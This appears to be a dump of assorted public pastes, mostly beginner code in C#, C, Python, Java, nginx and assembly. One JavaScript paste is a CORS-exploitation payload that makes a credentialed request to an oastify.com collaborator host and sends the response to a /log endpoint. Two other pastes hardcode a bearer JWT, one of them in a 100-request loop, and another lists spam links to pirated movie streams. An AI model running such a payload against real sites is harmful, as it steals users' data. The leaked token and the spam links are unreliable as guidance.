Константы объявляются перед блоком переменных и отделяются от них пустой строкой. Константы именуются с большой буквы. Если константа создана для связки консольное меню + switch (case) к имени константы добавляется Command или Menu - это передает суть константы, превращая ее в существительное, а не глагол и улучшает читаемость кода.

namespace ConvertorValut
{
    internal class Program
    {
        static void Main(string[] args)
        {

            Console.OutputEncoding = Encoding.UTF8;
            const string RubToEurCommand = ""1"";
            const string EurToRubCommand = ""2"";
            const string RubToUsdCommand = ""3"";           
            const string UsdToRubCommand = ""4"";
            const string EurToUsdCommand = ""5"";
            const string UsdToEurCommand = ""6"";
            
            float rubToEur;
            float eurToRub;
            float usdToRub;
            float rubToUsd;
            float eurToUsd;
            float UsdToEur;
            float rub;
            float euro;
            float usd;
            string userInput;
            float currencyCount;

            rubToEur = 0.01F;
            eurToRub = 98.29F;
            usdToRub = 91.68F;
            rubToUsd = 0.011F;
            eurToUsd = 0.92F;
            UsdToEur = 1.09F;

            Console.WriteLine(""Добро пожаловать в обменник валют. У нас вы можете обменять рубли в евро и евро в рубли, рубли на доллары, доллары на рубли, евро в доллары и доллары в евро "");
            Console.WriteLine(""Введите баланс рублей: "");
            rub = Convert.ToSingle(Console.ReadLine());
            Console.WriteLine(""Введите баланс евро: "");
            euro = Convert.ToSingle(Console.ReadLine());
            Console.WriteLine(""Введите баланс долларов: "");
            usd = Convert.ToSingle(Console.ReadLine());

            Console.WriteLine($""{RubToEurCommand} - обменять рубли на евро"");
            Console.WriteLine($""{EurToRubCommand} - обменять евро на рубли"");
            Console.WriteLine($""{RubToUsdCommand} - обменять рубли на доллары"");
            Console.WriteLine($""{UsdToRubCommand} - обменять доллары на рубли"");
            Console.WriteLine($""{EurToUsdCommand} - обменять евро на доллары"");
            Console.WriteLine($""{UsdToEurCommand} - обменять доллары на евро"");
            
            userInput = Console.ReadLine();

            switch (userInput)
            {
                case RubToEurCommand:
                    Console.WriteLine(""Обмен рублей на евро"");
                    Console.Write(""Сколько вы хотите обменять?: "");
                    currencyCount = Convert.ToSingle(Console.ReadLine());
                    
                    if (rub >= currencyCount)
                    {
                        rub -= currencyCount;
                        euro += currencyCount / eurToRub;
                    }
                    else
                    {
                        Console.WriteLine(""Недопустимое количество рублей"");
                    }

                    break;

                case EurToRubCommand:
                    Console.WriteLine(""Обмен евро на рубли"");
                    Console.Write(""Сколько вы хотите обменять?: "");
                    currencyCount = Convert.ToSingle(Console.ReadLine());

                    if ( euro >= currencyCount)
                    {
                        euro -= currencyCount;
                        rub += currencyCount / rubToEur;
                    }
                    else
                    {
                        Console.WriteLine(""Недопустимое количество евро"");
                    }

                    break;

                case RubToUsdCommand:
                    Console.WriteLine(""Обмен рублей на доллары"");
                    Console.Write(""Сколько вы хотите обменять?: "");
                    currencyCount = Convert.ToSingle(Console.ReadLine());
                    
                    if (usd >= currencyCount)
                    {
                        rub -= currencyCount;
                        usd += currencyCount / usdToRub;
                    }
                    else
                    {
                        Console.WriteLine(""Недопустимое количество рублей"");
                    }

                    break;

                case UsdToRubCommand:
                    Console.WriteLine(""Обмен долларов на рубли"");
                    Console.Write(""Сколько вы хотите обменять?: "");
                    currencyCount = Convert.ToSingle(Console.ReadLine());

                    if (usd >= currencyCount)
                    {
                        usd -= currencyCount;
                        rub += currencyCount / rubToUsd;
                    }
                    else
                    {
                        Console.WriteLine(""Недопустимое количество долларов"");
                    }

                    break;

                case EurToUsdCommand:
                    Console.WriteLine(""Обмен евро на долларов"");
                    Console.Write(""Сколько вы хотите обменять?: "");
                    currencyCount = Convert.ToSingle(Console.ReadLine());

                    if (euro >= currencyCount)
                    {
                        euro -= currencyCount;
                        usd += currencyCount / UsdToEur;
                    }
                    else
                    {
                        Console.WriteLine(""Недопустимое количество евро"");
                    }

                    break;

                case UsdToEurCommand:
                    Console.WriteLine(""обменять доллары на евро"");
                    Console.Write(""Сколько вы хотите обменять?: "");
                    currencyCount = Convert.ToSingle(Console.ReadLine());

                    if (euro >= currencyCount)
                    {
                        usd -= currencyCount;
                        euro += currencyCount / eurToUsd;
                    }
                    else
                    {
                        Console.WriteLine(""Недопустимое количество долларов"");
                    }

                    break;
            }

            Console.WriteLine($""Ваш баланс {rub}  рублей и {euro} евро и {usd} долларов "");
            Console.ReadKey();
        }
    }
}"
ULZzKbM1,Untitled,TheLastCSM,JavaScript,Tuesday 21st of November 2023 09:37:48 AM CDT,"<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','eo6gt556bg4o022ji6xz4z6nsey5m6av.oastify.com',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>"
wWsShisf,Nginx Omeka,fragilbert,Nginx,Tuesday 21st of November 2023 09:35:36 AM CDT,"server {
        server_name omeka.domain.tld;
        root /var/www/omeka;

        location = /favicon.ico {
                log_not_found off;
                access_log off;
        }

        location = /robots.txt {
                allow all;
                log_not_found off;
                access_log off;
        }

        location ~ \..*/.*\.php$ {
                return 403;
        }

        location / {
                try_files $uri /index.php?$args;
        }

        location /admin {
                try_files $uri /admin/index.php?$args;
        }

        location ~ \.php$ {
                fastcgi_split_path_info ^(.+\.php)(/.+)$;
                #NOTE: You should have ""cgi.fix_pathinfo = 0;"" in php.ini
                include fastcgi_params;
                fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
                fastcgi_intercept_errors on;
                fastcgi_pass unix:/tmp/phpfpm.sock;
        }

        location ~* \.(js|css|png|jpg|jpeg|gif|ico)$ {
                expires max;
                log_not_found off;
        }

        location /install {
                try_files $uri /install/index.php?$args;

                # This is an odd way to check that rewrites work...
                location ~* /install/check-mod-rewrite([^/]*)\.html$ {
                        rewrite ^ /install/mod-rewrite.php?enabled=true;
                }
        }
}"
aGEBXN2q,Uso de Java.Time,ovichan,Java,Tuesday 21st of November 2023 09:30:11 AM CDT,"//			  METODO CON LAS APIS ANTIGUAS
//            SimpleDateFormat formatter = new SimpleDateFormat(""dd/MM/yyyy"");
//            String dateInString = ""01/03/1995"";
//            java.sql.Date sqlDate;
//
//            try {
//                java.util.Date utilDate = formatter.parse(dateInString);
//                sqlDate = new java.sql.Date(utilDate.getTime());
//                sentencia.setDate(5, sqlDate);
//            } catch (ParseException e) {
//                e.printStackTrace();
//            }

			// USO API JAVA.TIME. (DESDE JAVA 8)
			// Estableciendo directamente la fecha
			// Date date = Date.valueOf(LocalDate.of(1995, 03, 01));

			// Usando un formatter
			String dateInString = ""01/03/1995"";
			DateTimeFormatter formatter = DateTimeFormatter.ofPattern(""dd/MM/yyyy"");
			java.sql.Date date = Date.valueOf(LocalDate.parse(dateInString, formatter));
			sentencia.setDate(5, date);"
Hc4UHffA,Bit manipulation through unions,BenTibnam,C,Tuesday 21st of November 2023 09:01:46 AM CDT,"#include <stdio.h>

typedef struct {
    unsigned b0: 8, b1: 8, b2: 8, b3: 8;
} word_bytes;

typedef struct{
    unsigned b0: 1, b1: 1, b2: 1, b3: 1, b4: 1, b5: 1, b6: 1, b7: 1, b8: 1, b9: 1, b10: 1, b11: 1, b12: 1, b13: 1, b14: 1, b: 15, b16: 1, b17: 1, b18: 1, b19: 1, b20: 1, b21: 1, b22: 1, b23: 1, b24: 1, b25: 1, b26: 1, b27: 1, b28: 1, b29: 1, b30: 1, b31: 1;
} word_bits;

typedef union {
    int         i;
    word_bits   bit;
    word_bytes  bytes;
} word;

int main()
{
    // sets all bits to 0
    word w = {0};
    
    // turing on bits
    w.bit.b8 = 1;
    w.bit.b12 = 1;
    
    // first 8 bits
    w.bytes.b0 = 'a';
    
    // third 8 bits
    w.bytes.b2 = 'A';
    
    // fourth 8 bits
    w.bytes.b3 = 12;
    
    printf(""w.i = %d\n"", w.i);
    printf(""w.b2 = %d  %c\n"", w.bytes.b2, w.bytes.b2);
    return 0;   
}"
e23upXDq,Dados Pessoais jQuery,estevaorada,HTML,Tuesday 21st of November 2023 08:57:51 AM CDT,"<!DOCTYPE html>
<html lang=""en"">
<head>
    <meta charset=""UTF-8"">
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
    <title>Detalhes Pessoais</title>
    <link rel=""stylesheet"" href=""https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css"">
</head>
<body>

<div class=""container mt-4"">
    <!-- Duas colunas -->
    <div class=""row"">
        <!-- Primeira coluna - Dropdown -->
        <div class=""col-md-6"">
            <h3>Selecione um Nome:</h3>
            <select class=""form-control"" id=""nomesDropdown"">
                <option value=""0"">João Silva</option>
                <option value=""1"">Maria Oliveira</option>
                <option value=""2"">Pedro Santos</option>
                <option value=""3"">Gabriela Rada</option>
                
            </select>
        </div>

        <div class=""col-md-6"">
            <h3>Detalhes do Nome Selecionado:</h3>
            <!-- Substitua os dados abaixo conforme resposta da API -->
            <img src=""https://i.imgur.com/rOUHt7d.jpg"" alt=""Foto"" class=""img-fluid"" style=""max-width: 100%;"">
            <h4>Nome: <span id=""detalheNome""></span></h4>
            <p>Descrição: <span id=""detalheDescricao""></span></p>
            <p>Idade: <span id=""detalheIdade""></span></p>
        </div>
    </div>

    <!-- Linha com Rodapé -->
    <div class=""row mt-4"">
        <div class=""col-md-12"">
            <footer class=""text-center"">
                <p>&copy; Detalhes Pessoais</p>
            </footer>
        </div>
    </div>
</div>

<!-- Adicione os scripts JavaScript do Bootstrap e seu próprio script se necessário -->
<script src=""https://code.jquery.com/jquery-3.5.1.min.js""></script>
<script src=""https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.3/dist/umd/popper.min.js""></script>
<script src=""https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js""></script>


<script>
    // Adicione o código JavaScript abaixo:
    
</script>

</body>
</html>"
FvuZpL4w,Untitled,KoctrX,JavaScript,Tuesday 21st of November 2023 08:43:29 AM CDT,"new Array(100).fill(false).forEach(() => {
    var myHeaders = new Headers();
    myHeaders.append(""authorization"", ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjcwLCJpYXQiOjE3MDA0NjU3NTcsImV4cCI6MTcwMzA1Nzc1N30.qtGS0OV6Eyf7tDv-pSP0EiK7IJqG9cdF9PP5MHBlm-k"");
    
    var requestOptions = {
      method: 'GET',
      headers: myHeaders,
      redirect: 'follow'
    };
    
    fetch(""https://aikit.webstaginghub.com/api/new-words?my_words=true&page=1&sortBy=name&sort=asc&isSimilar=true"", requestOptions)
      .then(response => response.text())
      .then(result => console.log(result))
      .catch(error => console.log('error', error));
});"
86pr20Hm,Nether Realms,DiYane,Python,Tuesday 21st of November 2023 08:33:37 AM CDT,"import re

demons = re.split("", *"", input())
demon_book = {}

demon_health_pattern = r'[^\d\+\-*\/\.]'
demon_damage_pattern = r'(?:\+|-)?[0-9]+(?:\.[0-9]+)?'
demon_operators_pattern = r'[*\/]'

for demon in demons:
    demon = demon.strip()
    demon_health = re.findall(demon_health_pattern, demon)
    demon_book[demon] = []
    demon_book[demon].append(sum(ord(match) for match in demon_health))

    demon_damage = re.finditer(demon_damage_pattern, demon)
    operators = re.findall(demon_operators_pattern, demon)
    current_demon_damage = 0

    for value in demon_damage:
        current_demon_damage += float(value.group(0))

    for operator in operators:
        if operator == '*':
            current_demon_damage *= 2
        elif operator == '/':
            current_demon_damage /= 2

    demon_book[demon].append(current_demon_damage)

for demon, qualities in sorted(demon_book.items()):
    print(f'{demon} - {qualities[0]} health, {qualities[1]:.2f} damage')"
pRv39tDP,6 bit union representing cards,BenTibnam,C,Tuesday 21st of November 2023 08:32:42 AM CDT,"#include <stdio.h>

// 6 bit structure
typedef struct pcard
{
    // don't need negative representation
    unsigned pips: 4;   // 4 bits = 0 - 15
    unsigned suits: 2;  // 2 bits = 0 - 3
} pcard;

int main()
{
    pcard c;
    
    /***
     * Suits numerical values
     * 0 - hearts
     * 1 - clubs
     * 2 - spades
     * 3 - diamonds
     ***/
    c.pips = 9;
    c.suits = 2;
    
    printf(""Card pip: %d\n"", c.pips);
    printf(""Card suits: %d\n"", c.suits);
}"
KWbBG4my,Untitled,KoctrX,JavaScript,Tuesday 21st of November 2023 08:32:05 AM CDT,"var myHeaders = new Headers();
myHeaders.append(""authorization"", ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjcwLCJpYXQiOjE3MDA0NjU3NTcsImV4cCI6MTcwMzA1Nzc1N30.qtGS0OV6Eyf7tDv-pSP0EiK7IJqG9cdF9PP5MHBlm-k"");

var requestOptions = {
  method: 'GET',
  headers: myHeaders,
  redirect: 'follow'
};

fetch(""https://aikit.webstaginghub.com/api/new-words?my_words=true&page=1&sortBy=name&sort=asc&isSimilar=true"", requestOptions)
  .then(response => response.text())
  .then(result => console.log(result))
  .catch(error => console.log('error', error));"
PW8dEViq,Simple Union Example,BenTibnam,C,Tuesday 21st of November 2023 08:19:52 AM CDT,"#include <stdio.h>

typedef union int_and_float{
    int i;
    float f;
} number;

int main() {
	// storing either a float or int in single 32bit value instead of two 32 bit values
    number n;
    
	printf(""int_and_floats are %d\n\n"", sizeof(n));

	// here will print 123 and a garbage value
    n.i = 123;
    printf(""%d\t\t%16.10e\n"", n.i, n.f);

 	// here will print a garbage value and 123.403
    n.f = 123.403f;
    printf(""%d\t\t%16.10e\n"", n.i, n.f);
    
	// using unions in arithmetic
    n.i = 123;
    int sum1 = n.i + 32;
    
    printf(""Sum 1 is %d\n"", sum1);
    
    n.f = 123.403;
    float sum2 = n.f + 4.465;
    
    printf(""Sum 2 is %.2f\n"", sum2);

    return 0;
}"
hcZqTikp,dfhdrhdrj,gadungw71,PHP,Tuesday 21st of November 2023 08:12:40 AM CDT,"https://groups.google.com/g/across-the-furious-sea2023--1080p/c/M8WYGKhMBaw
https://groups.google.com/g/-2023-full-hd/c/E8r_srSlknA
https://groups.google.com/g/across-the-furious-sea1080p/c/EDydYL0Ldd0
https://groups.google.com/g/123moviesthehungergamestheballadofsongbirdsandsnakes2023free/c/hm9QxHW0rT0
https://groups.google.com/g/comp.os.vms/c/RNbu1fBkrgw
https://gamma.app/public/TW-2023--4K-1080p-7spwlnciugzti4b
https://gamma.app/public/--20234K1080pFULL-HD--jfb4sm6lp0807l9
https://gamma.app/public/Watch-The-Hunger-Games-The-Ballad-of-Songbirds-and-Snakes-2023-Fr-l9f6suo5d82v439
https://gamma.app/public/123-The-Hunger-Games-The-Ballad-of-Songbirds-and-Snakes-2023-Watc-qox6su2szeyr8v9
https://www.taskade.com/p/1080-2023-01HFRCKRF6Z8HDT3C8FH7G59WG
https://www.taskade.com/p/tw-hd-2023-01HFRDV1VATJR2MAXGPS7EPDTP
https://www.taskade.com/p/2023-1080p-4-k-01HFRPCXYW4B940Q1PA42ETJY2
https://www.taskade.com/p/w-atch-the-hunger-games-the-ballad-of-songbirds-and-snakes-full-m-ovie-online-sci-fi-action-hd-strea-01HFRZ09X744KKNF7NQC3RS8RQ
https://www.taskade.com/p/the-hunger-games-the-ballad-of-songbirds-and-snakes-2023-full-movie-free-download-720p-480p-1080-p-01HFS0WH0A71P565SRGN5WPVJW
https://github.com/apps/across-the-furious-sea-2023
https://player.soundon.fm/p/13041640-94a7-422c-abe3-195454140dc8
https://player.soundon.fm/p/830b58e4-9005-4fa6-b5e4-2385dec9dd92
https://player.soundon.fm/p/1b5473b3-dbb9-42ee-90ab-76d6bdf7c740
https://github.com/apps/across-the-furious-sea-2023-hd-tw
https://github.com/apps/thehungergamesfullmoviefreeonline
https://baskadia.com/post/wvku
https://baskadia.com/post/x0ox
https://lookerstudio.google.com/reporting/4562d764-2b79-463e-8c61-c0d1aa744302
https://tempaste.com/kvxPXnk3jBZ
https://paste.cutelyst.org/PJbMZsldS
https://jsitor.com/asVG9p-RhQ
http://ben-kiki.org/ypaste/data/84845/index.html
https://tempel.in/view/hKAX1mO1
https://rentry.co/xmnae
https://bitbin.it/FODtpNZI/
https://homment.com/cHk50YdmfpcM4FFod3Bl
https://paste2.org/KDpFOa2n
https://justpaste.me/5RJN
https://snippet.host/iifxxr
https://glot.io/snippets/gqsxj8ep1m
https://jsfiddle.net/putradani/ujm52dxa/
https://rextester.com/KXY74677
https://ide.geeksforgeeks.org/online-c-compiler/def6b0b6-0644-4666-8b9a-d43f87daa8e9
https://tech.io/snippet/0YGQYLV
https://pastelink.net/mcfez4p5
https://ideone.com/KMQ9Ss
"
hx42i5Lb,Untitled,_kregm,Python,Tuesday 21st of November 2023 07:59:29 AM CDT,"# age = 20  # числовой тип данных, int
# name = 'Ivan'  # строковый тип данных, str
# a = 5.6  # дробь, float
# isActive = True  # bool, True/False
#
# Name = 'Sergey'
# nAme = 'Kirill'
#
#
# age_string = '22'
# age = int(age_string)
#
#
# print(age, end=' !!! ')
# print(1, 2, 3, end=' !!! ')
# print(age, name, a)
#
# print('separate', 'bool', 'get', sep='+')
#
#
# name = input('Введите свое имя: ')
# print('Привет '+name)
# print('Привет', name)
#
#
# a = int(input('Введите первое слагаемое: '))
# b = int(input('Введите второе слагаемое: '))
# print('Сумма:', a+b)
#
#
# a = input('Введите первое слагаемое: ')
# b = input('Введите второе слагаемое: ')
# print('Сумма:', a+b)

# firstname = input('Введите свое имя: ')
# lastname = input('Введите свою фамилию: ')
# print('Привет, ' + firstname + ' ' + lastname)
#
# print(1, 3, 29, sep='\n')
# \n - новая линия, новая строка
#
# print(10 % 3)
# print(10 // 3)
# print(10 ** 2)
# print(10 / 3)
#
#
# # 1. Посчитать сумму трех введенных чисел
#
# a = int(input('Введите первое число: '))
# b = int(input('Введите второе число: '))
# c = int(input('Введите третье число: '))
# print(a + b + c)
#
#
# # 2. Вводятся стороны прямоугольника(2 стороны, длина и ширина), посчитать его площадь
#
# a = int(input('Введите длину: '))
# b = int(input('Введите ширину: '))
# print(a * b)
#
# # 3. Вводится радиус круга, надо посчитать и вывести его площадь
#
# pi = 3.14
# radius = int(input('Введите радиус: '))
# print(pi * radius ** 2)
#
# # 4. Посчитать сумму трех введенных дробных чисел



# # Операторы сравнения: <, >, <=, >=, ==, !=.

# a = 100
# b = 380
#
# qwerty = False
# correct = True
# print(correct)
# sr = a > b
# print(sr , correct)
# correct = sr
# print(correct)
# print(a < b)
#
# a = 100
# b = 100
# c = 30
# d = 200
#
# print(a <= b)  # True
# print(a > b)  # False
# print(a == b)  # True
# print(a != b)  # False
# print(c == d)  # False
#
# # Логические операторы: not, and, or.
#
# print(not (a <= b))  # not True
#
# print((a <= b) and (a > b))  # True and False
# print((a <= b) and (a == b))  # True and True
# print((a != b) and (c == d))  # False and False
#
# print((a <= b) or (a > b))  # Всегда True, если есть хоть один True
# print(False or False)  # False
#
#
# # 1. Сравнить четность у двух введенных чисел.
#
# number_1 = int(input('Введите первое число: '))
# number_2 = int(input('Введите второе число: '))
# number_1 = number_1 % 2
# number_2 = number_2 % 2
# print(number_1 == number_2)
#
# 2. Вводятся 3 целых числа, проверить истинность выражения ""хотя бы одно из них положительное.""
#
# number_1 = int(input('Введите число: '))
# number_2 = int(input('Введите число: '))
# number_3 = int(input('Введите число: '))
# print((number_1 > 0) or (number_2 > 0) or (number_3 > 0))
"
sc80ED01,tema5,Bobita,Z80 Assembler,Tuesday 21st of November 2023 07:56:03 AM CDT,"data SEGMENT

new_print DB 0Ah,0Dh,""$""
data ENDS

code SEGMENT
ASSUME CS:code, DS:data


rec PROC
    CMP BX, 0             ;verifica daca a ajuns cu contorul la 0
    JE GOBACK
    PUSH BX               ;face push la valoarea curenta a contorului
    DEC BX                ;decrementeaza contorul
    CALL rec              ;apeleaza functia recursiv
    POP BX                ; in cazul in care contorul ajunge la 0 se scot valorile salvate pe stiva
    INC DX                ; aduna alt contor pe masura sunt scoase val din stiva
    ADD AX, DX            ;face efectiv adunarea
    GOBACK: MOV BX, AX    ;se copiaza rezultatul in bx
    
    RET
rec ENDP

; print in hexa
afis PROC
    MOV AL, BL
    MOV AH, 00h
    MOV CX, 2

CONVERSIE:
    ROL AL, 4 ;primele 4 caractere se muta la stanga 
    PUSH AX
    AND AL, 0Fh; procura primele 4(acum ultimele 4) caractere  
    ADD AL, '0' ;converteste in ascii
    CMP AL, '9' ;compara cu 9
    JBE CIFRA  ; verif daca e<10 si daca da, sare
    ADD AL, 7;daca nu trateaza cazul A-F
CIFRA:
    MOV DL, AL ;da store la ASCII in buffer
    MOV AH, 02h
    INT 21h
    POP AX
    DEC CX ; DECREMENTEAZA
    LOOP CONVERSIE

    MOV DL, 0Ah
    MOV AH, 02h ;serviciu de afișare asociat întreruperii INT 21H – Display output
    INT 21h

    RET
afis ENDP

start:
MOV AX, data
MOV DS, AX

MOV AX, 0
MOV BX, 06h
MOV DX, 0
call rec
call afis

MOV AH, 4Ch
INT 21h

code ENDS
END start"
